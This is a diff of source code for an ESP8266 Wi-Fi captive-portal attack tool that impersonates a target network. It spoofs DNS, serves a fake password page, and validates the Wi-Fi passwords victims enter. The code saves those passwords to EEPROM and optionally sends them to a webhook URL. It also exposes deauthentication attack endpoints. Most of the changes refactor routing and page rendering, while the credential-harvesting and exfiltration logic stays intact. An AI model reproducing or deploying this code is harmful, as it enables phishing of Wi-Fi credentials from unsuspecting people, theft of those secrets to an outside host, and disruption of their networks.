@@ -1,7 +1,7 @@
-////////////////////////////////////////////////////
-//              Made By HEINZGUENTER              //
-// github.com/heinzguenter/ESP8266-Captive-Portal //
-////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////
+//                  Made By HEINZGUENTER                  //
+// https://github.com/heinzguenter/ESP8266-Captive-Portal //
+//////////////////////////////////////////////////////////// 
 
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
@@ -33,13 +33,20 @@ SoftwareSerial esp(D1, D2);
 
 void redirect(String location){ webServer.sendHeader("Location", location, true); webServer.send(302); } //redirection function to reduce code 
 
+String progRead(const char* progString, const int size){ //CSS of the Index Page
+  char buffer[size];
+  strcpy_P(buffer, progString);
+  return buffer;
+}
+
+
 void handleDashboard() { //handles the dashboard page
   int networks = WiFi.scanNetworks(false); int scanstart = millis();
   while (networks <= 1 && millis() - scanstart < 5000){ delay(125); } //ensures that the website only loads if the scan is succesfull or it times out
   
   bool deauthing = false; if(digitalRead(D5) == 0){ deauthing = true; } //if the deauth LED of the slave is on set deauthing to true
   
-  webServer.send(200, "text/html", dashboard(indexLang, favicon, targetSSID, allPass, networks, validate, deauthing, webhookUrl));
+  webServer.send(200, "text/html", indexDashboard(progRead(baseFavicon, strlen_P(baseFavicon)), progRead(dashboardCSS, strlen_P(dashboardCSS)), allPass, networks, deauthing));
 
   if (webServer.hasArg("led_off")){ digitalWrite(LED_BUILTIN, HIGH); redirect("/dashboard"); } //calls the led off function if the button on the dashboard is pressed
 }
@@ -62,37 +69,36 @@ void handlePost(){
       }
     }
 
-    String command = readString.substring(0, readString.indexOf('|'));
-    if(command == "wifiStatus") { slaveStatus = readString.substring(readString.indexOf('|') + 1).toInt(); }
+    if(readString.substring(0, readString.indexOf('|')) == "wifiStatus") { slaveStatus = readString.substring(readString.indexOf('|') + 1).toInt(); }
   }
 
-  if (slaveStatus == 3 || validate == false){ //if conected or validation is turned off start password saving and redirecting to the restarting page
-    Serial.printf("Password Correct\n\n");
-    redirect("/restarting");
-
-    if(webhookUrl != ""){ //if webhook url is not empty therefore webhook is enabled send the command to send a webhook
-      esp.printf("webhook| "); delay(100);
-      esp.print(webhookUrl); delay(500);
-      esp.print(targetSSID); delay(500);
-      esp.print(pass);
-    }
-
-    pass = pass + '\t' + millis()/1000 + '\n'; //Adding password and seconds after bootup in a ordered list.
-    allPass += pass; //Updating the full passwords.
-
-    for (int i = 0; i <= pass.length(); ++i){ EEPROM.write(passEnd + i, pass[i]); } //Storing passwords to EEPROM
-
-    passEnd += pass.length(); //Updating end position of passwords in EEPROM.
-    EEPROM.write(passEnd, '\0');
-    EEPROM.commit();
-
-    digitalWrite(LED_BUILTIN, LOW);
-
-  } else { //if password was not correct redirect to the wrong password page
-    Serial.printf("Password Incorrect\n\n");
-    
+  if (slaveStatus != 3 && validate == true){ //if the password is wrong and password validation is turned on send the user to the wrong pass screen and stop the function
+    Serial.printf("Password Incorrect\n\n"); 
     redirect("/incorrectPass");
+
+    return;
   }
+
+  //if conected or validation is turned off start password saving and redirecting to the restarting page
+  Serial.printf("Password Correct\n\n");
+
+  redirect("/restarting");
+
+  if(webhookUrl != ""){ //if webhook url is not empty therefore webhook is enabled send the command to send a webhook
+    esp.printf("webhook| "); delay(100);
+    esp.print(webhookUrl); delay(500);
+    esp.print(targetSSID); delay(500);
+    esp.print(pass);
+  }
+
+  pass = pass + '\t' + millis()/1000 + '\n'; //Adding password and seconds after bootup in a ordered list.
+  for (int i = 0; i <= pass.length(); ++i){ EEPROM.write(passEnd + i, pass[i]); } //Storing passwords to EEPROM
+  allPass += pass; //Updating the full passwords.
+
+  passEnd += pass.length(); //Updating end position of passwords in EEPROM.
+  EEPROM.write(passEnd, '\0'); EEPROM.commit();
+
+  digitalWrite(LED_BUILTIN, LOW);
 }
 
 void handlePostSSID() {
@@ -104,7 +110,7 @@ void handlePostSSID() {
   EEPROM.write(postedSSID.length()+4, '\0');
   EEPROM.commit();
 
-  redirect("/dashboard");
+  redirect("/settings");
 
   WiFi.softAPdisconnect(true); //disable the ap
   delay(2000);
@@ -128,7 +134,7 @@ void handleLang(){ //change the language for the pages the user will see
   for (int i = 2; i < 4; ++i) { EEPROM.write(i, indexLang[i-2]); } EEPROM.commit(); //write ssid to the EEPROM
 
   Serial.printf("\nLanguage changed to: %s\n\n", indexLang.c_str());
-  redirect("/dashboard");
+  redirect("/settings");
 }
 
 void handleDeauth(){ //gets the target and duration for the deauth attack and sends the data to the deauth function
@@ -149,7 +155,7 @@ void stopDeauth(){
 }
 
 void setValidate(){
-  redirect("/dashboard");
+  redirect("/settings");
   
   if (webServer.arg("validate") == "on"){ validate = true; } else { validate = false; }
 
@@ -160,15 +166,17 @@ void setValidate(){
 }
 
 void setWebhookUrl(){
-  redirect("/dashboard");
+  redirect("/settings");
 
   webhookUrl = webServer.arg("url");
 
-  if(webhookUrl != ""){ Serial.printf("Webhook Url set to %s\n\n", webhookUrl.c_str()); } else { Serial.print("Webhook disabled\n"); }
+  if(webhookUrl == ""){ Serial.print("Webhook disabled\n"); return; } //if empty webhook is submitted, print log msg and stop the function
+  
+  Serial.printf("Webhook Url set to %s\n\n", webhookUrl.c_str());
 }
 
 void restoreDefaultSettings(){
-  redirect("/dashboard");
+  redirect("/settings");
   EEPROM.write(0, '\0'); //first start byte
 
   delay(2000); ESP.reset();
@@ -216,26 +224,30 @@ void setup(){
   Serial.printf("AP SSID: %s\n", currentSSID.c_str());
   dnsServer.start(DNS_PORT, "*", APIP); //DNS spoofing (Only for HTTP)
 
-  webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
+  webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, progRead(baseFavicon, strlen_P(baseFavicon)), targetSSID, progRead(CSS, strlen_P(CSS)))); });
+  webServer.onNotFound([](){ webServer.send(200, "text/html", Index(indexLang, progRead(baseFavicon, strlen_P(baseFavicon)), targetSSID, progRead(CSS, strlen_P(CSS)))); });
+  webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, progRead(baseFavicon, strlen_P(baseFavicon)), targetSSID, progRead(CSS, strlen_P(CSS)))); });
+  webServer.on("/restarting", []() {  webServer.send(200, "text/html", Fixing(indexLang, progRead(baseFavicon, strlen_P(baseFavicon)), targetSSID, progRead(CSS, strlen_P(CSS)))); });
   webServer.on("/post", handlePost);
-  webServer.on("/restarting", []() {  webServer.send(200, "text/html", Fixing(indexLang, favicon, targetSSID)); });
+
   webServer.on("/dashboard", handleDashboard);
+  webServer.on("/settings", [](){ webServer.send(200, "text/html", settingsDashboard(indexLang, progRead(baseFavicon, strlen_P(baseFavicon)), progRead(dashboardCSS, strlen_P(dashboardCSS)), targetSSID, validate, webhookUrl)); });
+
+  webServer.on("/defaults", restoreDefaultSettings);
   webServer.on("/clearPass", clearPass);
   webServer.on("/language", handleLang);
-  webServer.on("/deauth", handleDeauth);
-  webServer.on("/defaults", restoreDefaultSettings);
-  webServer.on("/stop", stopDeauth);
-  webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon, targetSSID)); });
   webServer.on("/ssid", handlePostSSID);
   webServer.on("/validate", setValidate);
   webServer.on("/webhook", setWebhookUrl);
-  
-  webServer.onNotFound([](){ webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
+
+  webServer.on("/deauth", handleDeauth);
+  webServer.on("/stop", stopDeauth);
+ 
   webServer.begin();
 
   //Enable the built-in LED
   pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH); //enable the builtin LED
-  pinMode(D5, INPUT);
+  pinMode(D5, INPUT); //set pin for checking if deauthing to input
 }
 
 void loop(){
